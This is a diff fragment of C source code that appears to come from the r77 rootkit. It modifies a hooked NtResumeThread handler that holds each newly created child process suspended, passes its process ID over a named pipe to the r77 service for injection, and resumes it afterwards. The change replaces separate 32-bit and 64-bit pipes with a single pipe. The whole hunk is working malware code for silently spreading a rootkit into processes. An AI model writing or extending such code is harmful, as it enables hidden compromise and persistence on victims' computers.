@@ -176,29 +176,25 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 	// When a process is created, its parent process calls NtResumeThread to start the new process after process creation is completed.
 	// At this point, the process is suspended and should be injected. After injection is completed, NtResumeThread should be called.
 	// To inject the process, a connection to the r77 service is performed through a named pipe.
-	// Because a 32-bit process can create a 64-bit child process, or vice versa, injection cannot be performed here.
+	// Because a 32-bit process can create a 64-bit child process, injection cannot be performed here.
 
 	DWORD processId = GetProcessIdOfThread(thread);
 	if (processId != GetCurrentProcessId()) // If NtResumeThread is called on this process, it is not a child process
 	{
-		BOOL is64Bit;
-		if (Is64BitProcess(processId, &is64Bit))
+		// Call the r77 service and pass the process ID.
+		HANDLE pipe = CreateFileW(CHILD_PROCESS_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+		if (pipe != INVALID_HANDLE_VALUE)
 		{
-			// Call either the 32-bit or the 64-bit r77 service and pass the process ID.
-			HANDLE pipe = CreateFileW(is64Bit ? CHILD_PROCESS_PIPE_NAME64 : CHILD_PROCESS_PIPE_NAME32, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-			if (pipe != INVALID_HANDLE_VALUE)
-			{
-				// Send the process ID to the r77 service.
-				DWORD bytesWritten;
-				WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);
+			// Send the process ID to the r77 service.
+			DWORD bytesWritten;
+			WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);
 
-				// Wait for the response. NtResumeThread should be called after r77 is injected.
-				BYTE returnValue;
-				DWORD bytesRead;
-				ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);
+			// Wait for the response. NtResumeThread should be called after r77 is injected.
+			BYTE returnValue;
+			DWORD bytesRead;
+			ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);
 
-				CloseHandle(pipe);
-			}
+			CloseHandle(pipe);
 		}
 	}
 
